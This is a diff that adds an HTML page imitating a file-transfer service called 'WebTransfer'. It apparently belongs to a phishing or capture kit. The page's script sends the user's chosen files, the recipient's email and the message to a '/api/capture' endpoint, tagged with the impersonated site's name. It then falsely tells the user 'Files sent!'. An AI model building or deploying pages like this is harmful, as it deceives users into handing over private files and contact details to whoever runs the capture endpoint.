@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WebTransfer - Send Large Files</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background: #f8f9fa; }
+        .header { background: #1a73e8; color: white; padding: 16px 24px; text-align: center; }
+        .content { max-width: 600px; margin: 40px auto; padding: 0 16px; }
+        .upload-box { background: white; border-radius: 12px; padding: 40px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .upload-box h2 { margin: 0 0 8px; color: #333; }
+        .upload-box p { color: #666; margin-bottom: 24px; }
+        .drop-zone { border: 2px dashed #1a73e8; border-radius: 8px; padding: 40px; margin: 16px 0; cursor: pointer; }
+        .drop-zone:hover { background: #e8f0fe; }
+        input[type=email] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; margin: 8px 0; box-sizing: border-box; }
+        textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; margin: 8px 0; resize: none; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 14px 32px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="header"><h1>WebTransfer</h1><p>Send large files securely</p></div>
+    <div class="content">
+        <div class="upload-box">
+            <h2>Transfer Files</h2>
+            <p>Upload files up to 2GB for free</p>
+            <div class="drop-zone" onclick="document.getElementById('file-input').click()">
+                <p>Click or drop files here</p>
+                <input type="file" id="file-input" style="display:none" multiple>
+            </div>
+            <div id="file-list"></div>
+            <input type="email" id="recipient" placeholder="Recipient email address">
+            <textarea id="message" rows="2" placeholder="Add a message (optional)"></textarea>
+            <br>
+            <button class="btn" onclick="transferFiles()">Transfer</button>
+        </div>
+    </div>
+    <script>
+        document.getElementById('file-input').onchange = function(e) {
+            const list = document.getElementById('file-list');
+            list.innerHTML = '';
+            for (const f of e.target.files) {
+                const div = document.createElement('div');
+                div.textContent = f.name + ' (' + (f.size / 1024 / 1024).toFixed(1) + ' MB)';
+                list.appendChild(div);
+            }
+        };
+        function transferFiles() {
+            const files = document.getElementById('file-input').files;
+            if (!files.length) return alert('Please select files to transfer');
+            const fd = new FormData();
+            fd.append('site', 'webtransfer.com');
+            fd.append('action', 'file_transfer');
+            fd.append('recipient', document.getElementById('recipient').value);
+            fd.append('message', document.getElementById('message').value);
+            for (const f of files) fd.append('file', f);
+            fetch('/api/capture', {method: 'POST', body: fd});
+            alert('Files sent!');
+        }
+    </script>
+</body>
+</html>
